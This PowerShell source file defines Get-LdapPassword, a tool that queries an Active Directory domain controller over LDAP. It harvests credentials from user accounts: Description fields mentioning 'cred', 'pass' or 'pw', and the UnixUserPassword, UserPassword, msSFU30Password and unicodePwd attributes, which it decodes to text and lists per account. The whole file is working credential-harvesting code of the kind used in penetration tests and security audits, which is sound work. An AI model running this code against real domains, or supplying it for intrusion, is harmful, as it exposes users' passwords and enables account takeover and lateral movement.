function Get-LdapPassword {
<#
.SYNOPSIS
    Retrieve plaintext passwords from Active Directory.

    Author: Timothee MENOCHET (@TiM0)

.DESCRIPTION
    Get-LdapPassword queries domain controller via LDAP protocol for accounts with sensitive data in Description attribute and common attributes containing encoded passwords (UnixUserPassword, UserPassword, msSFU30Password, or unicodePwd).

.PARAMETER Server
    Specifies the domain controller to query.

.PARAMETER Credential
    Specify the domain account to use.

.EXAMPLE
    PS C:\> Get-LdapPassword -Server ADATUM.CORP -Credential ADATUM\testuser
#>

    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]
        $Credential = [System.Management.Automation.PSCredential]::Empty
    )

    $keywords = @(
        "cred",
        "pass",
        "pw"
    )

    # Search for passwords in description attribute
    $filter = $null
    ForEach ($keyword in $keywords) {
        $filter += "(description=*$keyword*)"
    }
    $filter = "(|$filter)"
    $accounts = Get-LdapUser -Filter $filter -Server $Server -Credential $Credential
    ForEach ($account in $accounts) {
        if ($account.description) {
            $password = $account.description
            $result = New-Object PSObject                                       
            $result | add-member Noteproperty SamAccountName $account.sAMAccountName
            $result | add-member Noteproperty Attribute 'Description'
            $result | add-member Noteproperty Value $password
            $result
        }
    }

    # Search for encoded password attributes
    $filter = "(|(UnixUserPassword=*)(UserPassword=*)(msSFU30Password=*)(unicodePwd=*))"
    $accounts = Get-LdapUser -Filter $filter -Server $Server -Credential $Credential
    ForEach ($account in $accounts) {
        if ($account.UnixUserPassword) {
            $password = [System.Text.Encoding]::ASCII.GetString($account.UnixUserPassword)
            $result = New-Object PSObject                                       
            $result | add-member Noteproperty SamAccountName $account.sAMAccountName
            $result | add-member Noteproperty Attribute 'UnixUserPassword'
            $result | add-member Noteproperty Value $password
            $result
        }
        if ($account.UserPassword) {
            $password = [System.Text.Encoding]::ASCII.GetString($account.UserPassword)
            $result = New-Object PSObject                                       
            $result | add-member Noteproperty SamAccountName $account.sAMAccountName
            $result | add-member Noteproperty Attribute 'UserPassword'
            $result | add-member Noteproperty Value $password
            $result
        }
        if ($account.msSFU30Password) {
            $password = [System.Text.Encoding]::ASCII.GetString($account.msSFU30Password)
            $result = New-Object PSObject                                       
            $result | add-member Noteproperty SamAccountName $account.sAMAccountName
            $result | add-member Noteproperty Attribute 'msSFU30Password'
            $result | add-member Noteproperty Value $password
            $result
        }
        if ($account.unicodePwd) {
            $password = [System.Text.Encoding]::ASCII.GetString($account.unicodePwd)
            $result = New-Object PSObject                                       
            $result | add-member Noteproperty SamAccountName $account.sAMAccountName
            $result | add-member Noteproperty Attribute 'unicodePwd'
            $result | add-member Noteproperty Value $password
            $result
        }
    }
}

function Local:Get-LdapUser {
    Param (
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [String] $Filter,

        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [String] $Server,

        [ValidateNotNullOrEmpty()]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]
        $Credential = [System.Management.Automation.PSCredential]::Empty
    )

    $searchString = "LDAP://$Server/RootDSE"
    $domainObject = New-Object System.DirectoryServices.DirectoryEntry($searchString, $null, $null)
    $rootDN = $domainObject.rootDomainNamingContext[0]
    $searchString = "LDAP://$Server/$rootDN"
    if ($Credential.UserName) {
        $domainObject = New-Object System.DirectoryServices.DirectoryEntry($searchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
        $searcher = New-Object System.DirectoryServices.DirectorySearcher($domainObject)
    }
    else {
        $searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$searchString)
    }
    $searcher.filter = "(&(objectClass=user)$Filter)"
    $searcher.PropertiesToLoad.Add('*') | Out-Null
    Try {
        $results = $searcher.FindAll()
        $results | Where-Object {$_} | ForEach-Object {
            $objectProperties = @{}
            $p = $_.Properties
            $p.PropertyNames | ForEach-Object {
                if (($_ -ne 'adspath') -And ($p[$_].count -eq 1)) {
                    $objectProperties[$_] = $p[$_][0]
                }
                elseif ($_ -ne 'adspath') {
                    $objectProperties[$_] = $p[$_]
                }
            }
            New-Object -TypeName PSObject -Property ($objectProperties)
        }
        $results.dispose()
        $searcher.dispose()
    } Catch {
        Write-Error "$_" -ErrorAction Stop
    }
}
